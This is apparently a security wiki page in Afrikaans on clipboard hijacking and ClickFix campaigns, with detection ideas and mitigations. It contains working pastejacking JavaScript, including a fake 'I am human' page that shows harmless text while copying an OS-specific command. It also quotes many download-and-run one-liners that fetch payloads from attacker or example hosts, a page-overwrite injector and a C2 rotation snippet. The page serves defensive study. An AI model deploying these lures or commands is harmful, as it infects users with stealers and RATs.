# Clipboard Hijacking (Pastejacking)-aanvalle

> "Moet nooit iets plak wat jy nie self gekopieer het nie." – ou maar steeds geldige advies

## Oorsig

Clipboard hijacking – ook bekend as *pastejacking* – misbruik die feit dat gebruikers gereeld opdragte kopieer en plak sonder om dit te inspekteer. 'n Kwaadwillige webblad (of enige JavaScript-capable konteks soos 'n Electron- of Desktop-toepassing) plaas programmaties teks wat deur die aanvaller beheer word in die stelsel se clipboard. Slagoffers word gewoonlik deur noukeurig saamgestelde social-engineering-instruksies aangemoedig om **Win + R** (Run-dialoog), **Win + X** (Quick Access / PowerShell) te druk, of 'n terminaal oop te maak en die clipboard-inhoud te *plak*, wat arbitrêre opdragte onmiddellik uitvoer.

Omdat **geen lêer afgelaai en geen attachment oopgemaak word nie**, omseil die tegniek die meeste e-pos- en webinhoud-sekuriteitskontroles wat attachments, macros of direkte uitvoering van opdragte monitor. Die aanval is dus gewild in phishing campaigns wat commodity malware-families soos NetSupport RAT, Latrodectus loader of Lumma Stealer lewer.<sup>[[1]](#references)</sup>

## Wallet-adresvervangings-clippers

'n Ander **clipboard hijacking**-variant plak glad nie opdragte nie: dit wag totdat die slagoffer 'n **cryptocurrency wallet-adres** kopieer, en vervang dit dan stilweg met een wat deur die aanvaller beheer word net voor dit geplak word. Dit is veral effektief teen lang wallet-formate omdat gebruikers dikwels slegs die eerste/laaste karakters verifieer.<sup>[[8]](#references)</sup>

Algemene eienskappe in die werklike wêreld:
- **Thin loader + nested payload**: die sigbare app/exe lyk soos 'n wettige trading- of "profit"-tool, terwyl die werklike clipper dieper in die bundle versteek is (byvoorbeeld 'n .NET loader wat 'n nested Rust payload begin).
- **Regex-driven replacement**: die malware pas strings soos `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, of selfs generiese **44-character Solana-like** strings by en herskryf dit na attacker wallets.
- **Wallet rotation at scale**: moderne Windows-samples kan **duisende** replacement wallets per currency insluit in plaas van 'n enkele statiese adres, wat wallet reputation burn ná elke diefstal verminder.<sup>[[8]](#references)</sup>

### Windows clipper-vloei

'n Algemene implementering is 'n hidden window wat met **`AddClipboardFormatListener`** geregistreer is. Met elke clipboard update roep die malware tipies die volgende aan:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → kry toegang tot huidige clipboard-data.
- **`GetClipboardData`** → lees teks.
- **`EmptyClipboard`** + **`SetClipboardData`** → vervang die wallet-string met die attacker value.

Minimal hunting regexes wat gereeld in clippers gesien word:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
User-vlak persistence is voldoende vir impak. Een waargenome patroon is:<sup>[[8]](#references)</sup>
- Kopieer payload na **`%APPDATA%\silke\silke.exe`**
- Skep ’n **Startup-folder LNK** onder `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Opsporingsidees:
- Prosesse wat clipboard APIs voortdurend aanroep terwyl hulle ook onder `%APPDATA%` en die gebruiker se **Startup**-folder skryf.
- Nuwe LNK/uitvoerbare-lêer-skepping gevolg deur herskrywings van wallet-address clipboard-inhoud.
- Argiewe of vals-software-bundels wat baie ongebruikte lêers bevat, plus ’n klein launcher wat ’n geneste binary begin.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Op macOS versprei sommige veldtogte ’n **`unlocker.command`**-helper en instrueer die slagoffer om regs te klik → **Open** as Gatekeeper sê dat die app beskadig is of van ’n onbekende ontwikkelaar afkomstig is. Die script verwyder bloot quarantine en launch die nabygeleë `.app`:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Dit is **nie ’n Gatekeeper-exploit nie; dit is ’n **sosiaal-gemanipuleerde kwarantyn-omseiling** wat misbruik maak van die feit dat Gatekeeper-besluite van die `com.apple.quarantine` xattr afhang.<sup>[[8]](#references)</sup>

Ná uitvoering kan die clipper as die huidige gebruiker volhard deur die volgende te skryf:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper-skrip
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent met `RunAtLoad` en `KeepAlive`

’n Nuttige defensiewe detail is dat sommige samples ’n **selfherstellende watchdog** implementeer wat die LaunchAgent en wrapper ongeveer elke 30 sekondes herskryf. As jy die plist eerste verwyder **sonder om die lopende proses te beëindig**, kan die malware dit onmiddellik herskep.<sup>[[8]](#references)</sup> Veilige opruimingsvolgorde:
1. Beëindig die aktiewe clipper-proses.
2. Unload/verwyder die LaunchAgent-plist.
3. Verwyder `~/launch.sh` en die gekopieerde payload.

### Afleweringsnota: vals reputasie as ’n kragvermenigvuldiger

Vir hierdie familie kan die malware self tegnies eenvoudig bly terwyl die **verspreidingslaag** die swaar werk doen: vals GitHub-stars/forks, SourceForge-resensies/aflaaie, YouTube-tutoriaalopmerkings/-kyke, en onskuldig lykende VirusTotal-opmerkings/stemme word gebruik om die binary betroubaar te laat voorkom vóór uitvoering.<sup>[[8]](#references)</sup>

## Geforseerde kopieerknoppies en versteekte payloads (macOS one-liners)

Sommige macOS-infostealers kloon installer-webwerwe (byvoorbeeld Homebrew) en **dwing die gebruik van ’n “Copy”-knoppie af** sodat gebruikers nie net die sigbare teks kan selekteer nie. Die clipboard-inskrywing bevat die verwagte installer-opdrag plus ’n aangehegte Base64-payload (byvoorbeeld `...; echo <b64> | base64 -d | sh`), sodat een enkele plakaksie albei uitvoer terwyl die UI die ekstra stadium versteek.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ouer veldtogte het `document.execCommand('copy')` gebruik; nuwer veldtogte maak staat op die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Die ClickFix / ClearFake-vloei

1. Gebruiker besoek ’n webwerf met ’n nagebootste domeinnaam of ’n gekompromitteerde webwerf (bv. `docusign.sa[.]com`)
2. Ingevoegde **ClearFake** JavaScript roep ’n `unsecuredCopyToClipboard()`-helper aan wat stilweg ’n Base64-geënkodeerde PowerShell-eenreëlopdrag in die knipbord stoor.
3. HTML-instruksies sê vir die slagoffer: *“Druk **Win + R**, plak die opdrag en druk Enter om die probleem op te los.”*
4. `powershell.exe` word uitgevoer en laai ’n argief af wat ’n wettige uitvoerbare lêer plus ’n kwaadwillige DLL bevat (klassieke DLL sideloading).
5. Die laaier dekripteer bykomende fases, injecteer shellcode en installeer persistence (bv. scheduled task) – wat uiteindelik NetSupport RAT / Latrodectus / Lumma Stealer uitvoer.<sup>[[1]](#references)</sup>

### Voorbeeld van ’n NetSupport RAT-ketting
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) soek sy gids vir `msvcp140.dll`.
* Die kwaadwillige DLL los API's dinamies op met **GetProcAddress**, laai twee binaries (`data_3.bin`, `data_4.bin`) af via **curl.exe**, dekripteer hulle met behulp van 'n rollende XOR-sleutel `"https://google.com/"`, injecteer die finale shellcode en pak **client32.exe** (NetSupport RAT) uit na `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Laai `la.txt` af met **curl.exe**
2. Voer die JScript downloader binne **cscript.exe** uit
3. Haal ’n MSI payload op → plaas `libcef.dll` langs ’n ondertekende toepassing → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Die **mshta**-oproep loods ’n versteekte PowerShell-script wat `PartyContinued.exe` ophaal, `Boat.pst` (CAB) onttrek, `AutoIt3.exe` deur middel van `extrac32` en lêersamevoeging rekonstrueer, en uiteindelik ’n `.a3x`-script uitvoer wat blaaierbewyse na `sumeriavgv.digital` eksfiltreer.<sup>[[1]](#references)</sup>

## ClickFix: Klembord → PowerShell → JS eval → Opstart-LNK met roterende C2 (PureHVNC)

Sommige ClickFix-veldtogte slaan lêeraflaaie heeltemal oor en gee slagoffers opdrag om ’n one-liner te plak wat JavaScript via WSH ophaal en uitvoer, dit volhardend maak en C2 daagliks roteer. Voorbeeld van ’n waargenome ketting:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sleutelkenmerke
- Obfuscated URL word tydens looptyd omgedraai om toevallige inspeksie te omseil.
- JavaScript behou homself via ’n Startup LNK (WScript/CScript), en kies die C2 volgens die huidige dag – wat vinnige domeinrotasie moontlik maak.<sup>[[3]](#references)</sup>

Minimale JS-fragment wat gebruik word om C2’s volgens datum te roteer:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Die volgende stadium ontplooi gewoonlik ’n loader wat persistence vestig en ’n RAT (bv. PureHVNC) aflaai, dikwels deur TLS aan ’n hardgekodeerde sertifikaat te pin en verkeer in stukke op te deel.<sup>[[3]](#references)</sup>

Opsporingsidees spesifiek vir hierdie variant
- Prosesboom: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (of `cscript.exe`).
- Opstartartefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wat WScript/CScript met ’n JS-pad onder `%TEMP%`/`%APPDATA%` aanroep.
- Register/RunMRU en command-line-telemetrie wat `.split('').reverse().join('')` of `eval(a.responseText)` bevat.
- Herhaalde `powershell -NoProfile -NonInteractive -Command -` met groot stdin-payloads om lang scripts te voer sonder lang command lines.
- Scheduled Tasks wat daarna LOLBins uitvoer, soos `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, onder ’n updater-agtige taak/pad (bv. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daagliks roterende C2-hostname en URLs met die patroon `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korreleer clipboard-skryfgebeurtenisse wat gevolg word deur Win+R-plak en daarna onmiddellike `powershell.exe`-uitvoering.

Blue teams kan clipboard-, proses-skepping- en registertelemetrie kombineer om pastejacking-misbruik te identifiseer:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` hou ’n geskiedenis van **Win + R**-commands – soek na ongewone Base64-/obfuscated-inskrywings.
* Security Event ID **4688** (Process Creation) waar `ParentImage` == `explorer.exe` en `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } is.
* Event ID **4663** vir lêerskeppings onder `%LocalAppData%\Microsoft\Windows\WinX\` of tydelike vouers net voor die verdagte 4688-gebeurtenis.
* EDR-clipboard-sensors (indien beskikbaar) – korreleer `Clipboard Write` wat onmiddellik gevolg word deur ’n nuwe PowerShell-proses.

## IUAM-styl-verifikasiebladsye (ClickFix Generator): clipboard-kopiëring-na-console + OS-bewuste payloads

Onlangse veldtogte vervaardig op groot skaal vals CDN-/browser-verifikasiebladsye ("Just a moment…", IUAM-styl) wat gebruikers dwing om OS-spesifieke commands vanaf hul clipboard na native consoles te kopieer. Dit verskuif uitvoering uit die browser-sandbox en werk op Windows en macOS.<sup>[[4]](#references)</sup>

Belangrikste kenmerke van die builder-gegenereerde bladsye
- OS-detectie via `navigator.userAgent` om payloads aan te pas (Windows PowerShell/CMD teenoor macOS Terminal). Opsionele decoys/no-ops vir onondersteunde OS’e om die illusie te handhaaf.
- Outomatiese clipboard-kopiëring tydens benigne UI-aksies (checkbox/Copy), terwyl die sigbare teks van die clipboard-inhoud kan verskil.
- Mobiele blokkering en ’n popover met stap-vir-stap-instruksies: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opsionele obfuscation en ’n single-file injector om ’n gekompromitteerde webwerf se DOM met ’n Tailwind-gestileerde verifikasie-UI te oorskryf (geen nuwe domeinregistrasie benodig nie).<sup>[[4]](#references)</sup>

Voorbeeld: clipboard-mismatch + OS-bewuste branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS-volharding van die aanvanklike uitvoering
- Gebruik `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` sodat uitvoering voortgaan nadat die terminal sluit, wat sigbare artefakte verminder.<sup>[[4]](#references)</sup>

In-place-bladsy-oorneming op gekompromitteerde webwerwe
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Opsporings- en hunting-idees spesifiek vir IUAM-styl lures
- Web: Bladsye wat die Clipboard API aan verifikasie-widgets bind; wanpassing tussen die vertoonde teks en die clipboard-payload; `navigator.userAgent`-vertakking; Tailwind + single-page-vervanging in verdagte kontekste.
- Windows-eindpunt: `explorer.exe` → `powershell.exe`/`cmd.exe` kort ná ’n blaaierinteraksie; batch/MSI-installers wat vanuit `%TEMP%` uitgevoer word.
- macOS-eindpunt: Terminal/iTerm wat `bash`/`curl`/`base64 -d` met `nohup` naby blaaiergebeure spawn; agtergrondtake wat voortbestaan nadat die terminale gesluit is.
- Korrelleer `RunMRU` Win+R-geskiedenis en clipboard-skrywings met daaropvolgende konsole-prosesskepping.

Sien ook vir ondersteunende tegnieke

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix-evolusies (ClearFake, Scarlet Goldfinch)

- ClearFake gaan voort om WordPress-webwerwe te kompromitteer en loader JavaScript in te spuit wat eksterne hosts (Cloudflare Workers, GitHub/jsDelivr) aanmekaar skakel, asook blockchain-“etherhiding”-oproepe (byvoorbeeld POSTs na Binance Smart Chain API-eindpunte soos `bsc-testnet.drpc[.]org`) om huidige lure-logika op te haal. Onlangse overlays gebruik sterk fake CAPTCHAs wat gebruikers opdrag gee om ’n eenreël-opdrag (T1204.004) te copy/paste eerder as om enigiets af te laai.<sup>[[6]](#references)</sup>
- Aanvanklike uitvoering word toenemend aan signed script hosts/LOLBAS gedelegeer. Januarie 2026-kettings het vroeëre `mshta`-gebruik vervang met die ingeboude `SyncAppvPublishingServer.vbs`, wat via `WScript.exe` uitgevoer word en PowerShell-agtige argumente met aliases/wildcards deurgee om afgeleë inhoud te haal:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` is onderteken en word normaalweg deur App-V gebruik; saam met `WScript.exe` en ongewone argumente (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) word dit ’n hoë-sein LOLBAS-stadium vir ClearFake.<sup>[[6]](#references)</sup>
- Vervalste CAPTCHA-payloads van Februarie 2026 het teruggeskuif na suiwer PowerShell download cradles. Twee aktiewe voorbeelde:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Die eerste ketting is ’n in-geheue `iex(irm ...)` grabber; die tweede een gebruik `WinHttp.WinHttpRequest.5.1`, skryf ’n tydelike `.ps1`, en begin dit dan met `-ep bypass` in ’n versteekte venster.<sup>[[6]](#references)</sup>

Opsporings-/hunting-wenke vir hierdie variante
- Prosesafkoms: blaaier → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` of PowerShell cradles onmiddellik ná knipbordskrywings/Win+R.
- Sleutelwoorde in die command line: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker-domeine, of rou IP `iex(irm ...)`-patrone.
- Netwerk: uitgaande verbindings na CDN worker-hosts of blockchain RPC-endpunte vanaf script-hosts/PowerShell kort ná webblaai.
- Lêer/register: skep van tydelike `.ps1` onder `%TEMP%`, plus RunMRU-inskrywings wat hierdie eenreëls bevat; blokkeer/waarsku oor signed-script LOLBAS (WScript/cscript/mshta) wat met eksterne URL’s of geobfuskeerde alias-stringe uitgevoer word.

## ClickFix tradecraft van Junie 2026: paste-telemetrie, vals verifikasiekommentare en LOLBin-ketting

Onlangse Red Canary-telemetrie toon dat die stabiele aanduiding **nie een presiese opdrag is nie**, maar die kombinasie van **gebruikerondersteunde plak-en-uitvoer**, **vertroude interpreteerders/LOLBins**, **geobfuskeerde vlae**, **afstandverkryging**, en **onmiddellike uitvoering**.<sup>[[7]](#references)</sup>

### Opmerklike operateurpatrone

- **Telemetrie vir plakbevestiging**: sommige payloads roep `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` aan voordat die werklike stadium begin. Dit bevestig gebruikersinteraksie terwyl die venster kort en stil gehou word.
- **Vals verifikasiekommentare**: PowerShell-eenreëls kan stringe soos `# Security check ✔️ I'm not a robot Verification ID: 138105` byvoeg sodat die opdrag steeds CAPTCHA-verwant lyk nadat dit in Run / `cmd.exe` / PowerShell-geskiedenis geplak is.
- **Dinamiese URL-herkonstruksie**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` vermy ’n statiese URL in die command line terwyl dit steeds aflaai-en-uitvoer in die geheue uitvoer.
- **Gemaskerde installer-uitvoering**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` misbruik ongewone hoof-/kleinlettergebruik en Unicode-agtige karakters in vlae om swak detections te omseil, terwyl dit steeds soos `msiexec.exe` lyk.
- **Caret-ge-escape LOLBin-kettings**: `cmd.exe` kan sleutelwoorde met `^`-escapes versteek (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), die geneste shell geminimaliseerd begin, aanvallerinhoud met ’n onskadelike uitbreiding soos `.pdf` stoor, en dit dan deur `mshta` uitvoer.<sup>[[7]](#references)</sup>
## Versagtende maatreëls

1. Blaaierverharding – deaktiveer knipbord-skryftoegang (`dom.events.asyncClipboard.clipboardItem` ens.) of vereis ’n gebruikersgebaar.
2. Sekuriteitsbewustheid – leer gebruikers om sensitiewe opdragte te *tik* of dit eers in ’n teksredigeerder te plak.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control om arbitrêre eenreëls te blokkeer.
4. Netwerkkontroles – blokkeer uitgaande versoeke na bekende pastejacking- en malware-C2-domeine.

## Verwante truuks

* **Discord Invite Hijacking** misbruik dikwels dieselfde ClickFix-benadering nadat gebruikers na ’n kwaadwillige server gelok is:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Die klik regstel: Voorkoming van die ClickFix-aanvalvektor](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Onder die Pure Curtain: Van RAT tot Builder tot Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Die ClickFix-fabriek: Eerste blootstelling van IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, die jaar van die Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligensie-insigte: Februarie 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligensie-insigte: Junie 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Van sterre tot Upvotes: Valse reputasie wat ’n Crypto Clipboard Hijacker aandryf](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
